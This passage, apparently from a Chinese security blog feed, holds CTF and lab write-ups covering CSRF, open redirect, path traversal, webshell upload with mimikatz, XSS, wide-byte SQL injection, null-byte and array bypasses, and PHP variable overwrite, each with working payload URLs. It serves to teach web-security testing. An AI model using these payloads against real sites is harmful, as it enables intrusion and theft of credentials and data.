alt="img"></p><p>####这关需要RMB购买哦</p><p>1）点开可以看到只有一个登陆框，查看源代码看是否有tips,</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-22%20%E4%B8%8B%E5%8D%888.51.55.png" alt="屏幕快照 2017-10-22 下午8.51.55"></p><p>果真是有提示的：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-22%20%E4%B8%8B%E5%8D%889.02.58.png" alt="屏幕快照 2017-10-22 下午9.02.58"></p><p>2）跟着提示走，猜测是否可能为注入，但是当我访问链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.188.129/pentest/test/2/index.php?url=123</span><br></pre></td></tr></table></figure><p>却出现了弹出并显示成功跳转，没啥用，还是看下账号密码吧，第一题注入也可以看到这个账号密码。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-22%20%E4%B8%8B%E5%8D%889.05.03.png" alt="屏幕快照 2017-10-22 下午9.05.03"></p><p>3）账号：密码&gt;&gt;&gt;tom:123456登陆抓包可以控制金额进行买卖</p><p>####越权</p><p>1）让修改密码所以目标就很明确了，我要越权修改别人的密码</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-22%20%E4%B8%8B%E5%8D%8810.11.33.png" alt="屏幕快照 2017-10-22 下午10.11.33"></p><p>8.csrf</p><p>题目已经提示了是csrf所以我门使用burpsuite抓包然后直接生成PoC即可。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8A%E5%8D%8810.39.23.png" alt="屏幕快照 2017-10-24 上午10.39.23"></p><p>我们可以来测试一下效果：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8A%E5%8D%8810.42.42.png" alt="屏幕快照 2017-10-24 上午10.42.42"></p><p>首先我们访问我们的PoC</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8A%E5%8D%8810.42.57.png" alt="屏幕快照 2017-10-24 上午10.42.57"></p><p>之后点击submit便可以看到提示修改密码成功：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8A%E5%8D%8810.43.04.png" alt="屏幕快照 2017-10-24 上午10.43.04"></p><p>####URL跳转</p><p>看到题目的提示我突然想到前面在源码中看到的一个提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;index.php?url=#&quot;&gt;I&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>从这里顿时想到了跳转的原理，所以我们只需要这样做就可以访问百度了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.188.129/pentest/test/5/index.php?url=https://www.baidu.com/</span><br></pre></td></tr></table></figure><p>####文件下载</p><p>直接访问发现是404，感觉有问题，还以为是要扫描发现某些文件，但发现不是，便去服务器看了下题目源码：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/92017-10-24%20%E4%B8%8A%E5%8D%8810.54.40.png" alt="屏幕快照 2017-10-24 上午10.54.40"></p><p>可以看到这个index.php是有问题的，所以我们直接看download.php即可</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/102017-10-24%20%E4%B8%8A%E5%8D%8810.59.28.png" alt="屏幕快照 2017-10-24 上午10.59.28"></p><p>觉得没有方向的话还是先看源码或者抓包看有没有提示，很巧在源码中我们可以看到有个tips：帮管理员找回mysql帐号密码。通过文件下载找管理员密码，那么可以判断此处应该是任意文件下载漏洞。而要找到管理员的密码我们肯定是要先下载数据库配置文件之后看情况来判断是否需要下载数据库文件。通过之前那个题我们知道这个靶场的apache没有配置好导致文件路径泄漏的问题。所以我们来手动翻一翻。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/112017-10-24%20%E4%B8%8A%E5%8D%8811.08.29.png" alt="屏幕快照 2017-10-24 上午11.08.29"></p><p>发现data这个路径下什么都没有，所以是不是可能存在一个跟data同级的目录（其实刚才看源码我都看到了）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/122017-10-24%20%E4%B8%8A%E5%8D%8811.10.34.png" alt="屏幕快照 2017-10-24 上午11.10.34"></p><p>成功发现config.php，之后我们构造PoC进行下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.188.129/pentest//test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php</span><br></pre></td></tr></table></figure><p>之后打开就可以找到密码了，并不需要进一步对数据库做什么。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/132017-10-24%20%E4%B8%8A%E5%8D%8811.13.29.png" alt="屏幕快照 2017-10-24 上午11.13.29"></p><p>####我和上题有点像</p><p>这个和上面几乎一样，只不过参数的提交方式变了而已，我们用burp抓包然后修改pic参数即可。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-24%20%E4%B8%8A%E5%8D%8811.54.08.png" alt="屏幕快照 2017-10-24 上午11.54.08"></p><p>####我系统密码忘记了</p><p>1）使用账号密码：tom；123456进行登录，登录后发现可以上传文件，所以便尝试上传webshell</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-24%20%E4%B8%8B%E5%8D%8812.00.24.png" alt="屏幕快照 2017-10-24 下午12.00.24"></p><p>2）发现没有任何过滤，所以之后使用cknife进行连接</p><p>3）上传mimikatz抓取管理员密码即可</p><p>####xss</p><p>无任何过滤的一个反射型xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.188.129/pentest/test/9/?id=%3Cscript%3Ealert(%27npusec%27)%3C/script%3E</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-24%20%E4%B8%8B%E5%8D%8812.12.35.png" alt="屏幕快照 2017-10-24 下午12.12.35"></p><p>####存储型xss</p><p>也是不存在任何的过滤，只需要在留言处填写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/npusec/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-24%20%E4%B8%8B%E5%8D%8812.16.02.png" alt="屏幕快照 2017-10-24 下午12.16.02"></p><p>####什么？图片上传不了？</p><p>1）上传一张图片</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8B%E5%8D%883.05.40.png" alt="屏幕快照 2017-10-24 下午3.05.40"></p><p>2）上传php脚本</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8B%E5%8D%883.05.56.png" alt="屏幕快照 2017-10-24 下午3.05.56"></p><p>3）不能是图片还不能是脚本，我们看下处理的逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>],<span class="string">"image"</span>)&amp;&amp;strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"php"</span>))&#123;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">    <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"png"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpeg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"bmp"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"gif"</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;你真的上传了图片,可是这张图片我不喜欢,能换张吗?&lt;/font&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='blue'&gt;你居然不上传图片,宝宝怒了!!&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</span><br></pre></td></tr></table></figure><p>4）根据代码来判断文件的type要为image、其次文件name要有php：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8B%E5%8D%883.14.16.png" alt="屏幕快照 2017-10-24 下午3.14.16"></p><p>####明天双十一</p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strstr($url,<span class="string">"www.taobao.com"</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]==<span class="string">"10.10.10.10"</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"不想剁手了"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"nono"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"哎呀，这里只允许10.10.10.10访问！！！"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"这个地方剁手不好，换个地方！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一目了然，只需要将几个关键地方设置正确即可：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8B%E5%8D%883.01.40.png" alt="屏幕快照 2017-10-24 下午3.01.40"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;####普通的GET注入&lt;/p&gt;
&lt;p&gt;解法一：使用sqlmap&lt;/p&gt;
&lt;p&gt;1）sqlmap -u”&lt;a href=&quot;http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1&amp;quot;&quot; target=&quot;_bl
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>南京邮电CTF题解</title>
    <link href="http://zer0yu.github.io/2017/10/24/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF%E9%A2%98%E8%A7%A3/"/>
    <id>http://zer0yu.github.io/2017/10/24/南京邮电CTF题解/</id>
    <published>2017-10-24T08:02:49.000Z</published>
    <updated>2017-10-24T08:05:10.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>nctf{flag_admiaanaaaaaaaaaaa}</p><h4 id="php的弱类型加MD5碰撞"><a href="#php的弱类型加MD5碰撞" class="headerlink" title="php的弱类型加MD5碰撞"></a>php的弱类型加MD5碰撞</h4><p>首先考察post提交数据，然后考察md5碰撞，MD5加密QNKCDZ0可以看到是0exxxxxxxxx之类的字符，你只需要找到一个字符串，md5加密后是0e开头就好了。例如： aabg7XSs</p><p>flag nctf{md5_collision_is_easy}</p><h4 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h4><p>考察html中的一些知识，在此直接用开发者工具修改即可</p><p>nctf{follow_me_to_exploit}</p><h4 id="基本图片隐写术"><a href="#基本图片隐写术" class="headerlink" title="基本图片隐写术"></a>基本图片隐写术</h4><p>macos下类似winhex的软件有<a href="http://ridiculousfish.com/hexfiend/" target="_blank" rel="noopener">http://ridiculousfish.com/hexfiend/</a></p><p>nctf{photo_can_also_hid3_msg}</p><h4 id="源码分析进阶"><a href="#源码分析进阶" class="headerlink" title="源码分析进阶"></a>源码分析进阶</h4><p>访问连接，没看出端倪，直接用burpsuite的spider模块爬了一下，结果发现404.html，访问之后查看源代码，进而发现端倪。</p><p>nctf{this_is_a_fl4g}</p><h4 id="js的AAencode"><a href="#js的AAencode" class="headerlink" title="js的AAencode"></a>js的AAencode</h4><p>其实已经提示是AAencode了，想办法解密就行。比如你可以再<a href="http://tool.isex.ren/aadecode" target="_blank" rel="noopener">http://tool.isex.ren/aadecode</a>这个网站进行解密。机密结果就是flag（有人说浏览器打开是乱码，这样的话你wget下载，然后记事本打开就行）</p><p>alert(“nctf{javascript_aaencode}”)</p><h4 id="单身拼手速"><a href="#单身拼手速" class="headerlink" title="单身拼手速"></a>单身拼手速</h4><p>我觉得是题目没有出好，我直接在burpsuite中抓包就看到了flag</p><p>当然也可能是出好了，考察的就是跳转</p><p>nctf{yougotit_script_now}</p><h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>一看就知道是改referer，因为在http头中来源地就是这个参数，在hackbar中修改了就行。</p><p>nctf{http_referer}</p><h4 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpfunction CLsI($ZzvSWE) &#123;    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);    &#125;    return $ZzvSWE;&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</span><br></pre></td></tr></table></figure><p>修改为如下代码，运行即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function CLsI($ZzvSWE) &#123;</span><br><span class="line"></span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line"></span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $ZzvSWE;</span><br><span class="line"></span><br><span class="line">&#125;echo(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt;</span><br></pre></td></tr></table></figure><p>其实我觉得这个不是在考代码审计，因为你echo一下就有flag了。但是还是说下这个解密。具体参考这个文章<a href="https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html" target="_blank" rel="noopener">https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html</a></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>参考如下文章，构造<a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</a></p><p><a href="http://www.2cto.com/article/201311/258420.html" target="_blank" rel="noopener">http://www.2cto.com/article/201311/258420.html</a></p><p>实在不会我们还有工具：<a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="noopener">https://github.com/D35m0nd142/LFISuite</a></p><h4 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h4><p>考察302跳转：<a href="http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html</a></p><p>做题用burp抓包放repeater就行，其实用curl也可以</p><p>例如我用curl命令来做一下，其实这个源码也很好猜的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl -i http://chinalover.sinaapp.com/web9/index.php</span><br><span class="line"></span><br><span class="line">HTTP/1.1 302 Found</span><br><span class="line"></span><br><span class="line">Server: sae</span><br><span class="line"></span><br><span class="line">Date: Mon, 11 Sep 2017 08:29:53 GMT</span><br><span class="line"></span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">flag: nctf&#123;this_is302redirect&#125;</span><br><span class="line"></span><br><span class="line">Location: http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php</span><br><span class="line"></span><br><span class="line">Via: 1566</span><br></pre></td></tr></table></figure><h4 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h4><p>提示了文件下载，可以联想到任意文件下载漏洞，这样的话我们可以顺利的下载网站的源码进行审计的。我们先下载download.php（文件名是base64编码的），之后我们可以看到还有一个hereiskey.php，继续下载即可得到flag:nctf{download_any_file_666}</p><p>download.php的源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">include(&quot;hereiskey.php&quot;);</span><br><span class="line"></span><br><span class="line">$url=base64decode($GET[url]);</span><br><span class="line"></span><br><span class="line">if( $url==&quot;hereiskey.php&quot; || $url==&quot;buxiangzhangda.mp3&quot; || $url==&quot;xingxingdiandeng.mp3&quot; || $url==&quot;download.php&quot;)&#123;</span><br><span class="line"></span><br><span class="line">$file_size = filesize($url);</span><br><span class="line"></span><br><span class="line">header ( &quot;Pragma: public&quot; );</span><br><span class="line"></span><br><span class="line">header ( &quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot; );</span><br><span class="line"></span><br><span class="line">header ( &quot;Cache-Control: private&quot;, false );</span><br><span class="line"></span><br><span class="line">header ( &quot;Content-Transfer-Encoding: binary&quot; );</span><br><span class="line"></span><br><span class="line">header ( &quot;Content-Type:audio/mpeg MP3&quot;);</span><br><span class="line"></span><br><span class="line">header ( &quot;Content-Length: &quot; . $file_size);</span><br><span class="line"></span><br><span class="line">header ( &quot;Content-Disposition: attachment; filename=&quot;.$url);</span><br><span class="line"></span><br><span class="line">echo(file_get_contents($url));</span><br><span class="line"></span><br><span class="line">exit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else &#123;</span><br><span class="line"></span><br><span class="line">echo &quot;Access Forbidden!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h4><p>看到提示0==not，果断抓包把0改成1，然后就有了flag</p><p>flag:nctf{cookie_is_different_from_session}</p><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h4><p>提示让看robots.txt</p><p>然后看到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpif($GET[id]) &#123;   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);  mysql_select_db(SAE_MYSQL_DB);  $id = intval($GET[id]);  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;));  if ($_GET[id]==1024) &#123;      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;  &#125;  else&#123;    echo($query[content]);  &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure><p>其实在此处是考察mysql中的一个精度问题，比如2014.1虽然在php中哦按段不等于2014，但是再查询时，加入mysql设置id为整型，那么2014.1就会变成2014。</p><p>the flag is:nctf{query_in_mysql}</p><h4 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h4><p>其实看到连接就知道是gbk的问题了，后面提示也有</p><p>your sql:select id,title from news where id = ‘2’</p><p>gbk_sql_injection</p><p>关于宽字节注入问题可以看这个文章：</p><p><a href="http://www.91ri.org/8611.html" target="_blank" rel="noopener">http://www.91ri.org/8611.html</a></p><p><a href="https://www.2cto.com/article/201301/182881.html" target="_blank" rel="noopener">https://www.2cto.com/article/201301/182881.html</a></p><p>你可以手动来做：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=ß&apos; union select 1,database() #</span><br></pre></td></tr></table></figure><p>your sql:select id,title from news where id = ‘運’ union select 1,database() #’</p><p>sae-chinalover</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>your sql:select id,title from news where id = ‘id=運’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #’</p><p>ctf,ctf2,ctf3,ctf4,news</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23</span><br></pre></td></tr></table></figure><p>your sql:select id,title from news where id = ‘運’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 #’</p><p>id,flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(id,0x3a,flag) from ctf4 %23</span><br></pre></td></tr></table></figure><p>your sql:select id,title from news where id = ‘運’ union select 1,group_concat(id,0x3a,flag) from ctf4 #’</p><p>1:nctf{gbk_3sqli}</p><h4 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h4><p>看标题就知道这个是在考察00截断</p><p>分析下这段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (isset ($GET[&apos;nctf&apos;])) &#123;        if (@ereg (&quot;^[1-9]+$&quot;, $GET[&apos;nctf&apos;]) === FALSE)            echo &apos;必须输入数字才行&apos;;        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)               die(&apos;Flag: &apos;.$flag);        else            echo &apos;骚年，继续努力吧啊~&apos;;    &#125;</span><br></pre></td></tr></table></figure><p>ereg(mode, string subject, array regs);</p><p>mode：正则表达式（preg_match中的mode必须以’/‘开始和“/”结束）</p><p>subject： 需要验证的字符串</p><p>matchs/regs： 匹配后得到的结果。以数组的形式存储</p><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p><p>构造：</p><p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu</a></p><p>网上也有说构造</p><p><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]=</a></p><p>这个原因是因为报错并返回null（多亏了wonderkun大佬）</p><h4 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h4><p>这个题跟上面那个是不一样的，注意是===</p><p>所以姿势如下：<a href="http://www.cnblogs.com/weidiao/p/6821812.html" target="_blank" rel="noopener">http://www.cnblogs.com/weidiao/p/6821812.html</a></p><p><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c</a></p><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p>看下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    extract($_POST);</span><br><span class="line"></span><br><span class="line">    if ($pass == $thepassword_123) &#123; ?&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php &#125; ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php &#125; ?&gt;</span><br></pre></td></tr></table></figure><p>extract()出现的问题，详情见：</p><p><a href="http://www.cnblogs.com/sqyysec/p/6926095.html" target="_blank" rel="noopener">http://www.cnblogs.com/sqyysec/p/6926095.html</a></p><p>构造：</p><p>pass=1&amp;thepassword_123=1 post方式提交就行（使用hackbar和burp均可）</p><h4 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" 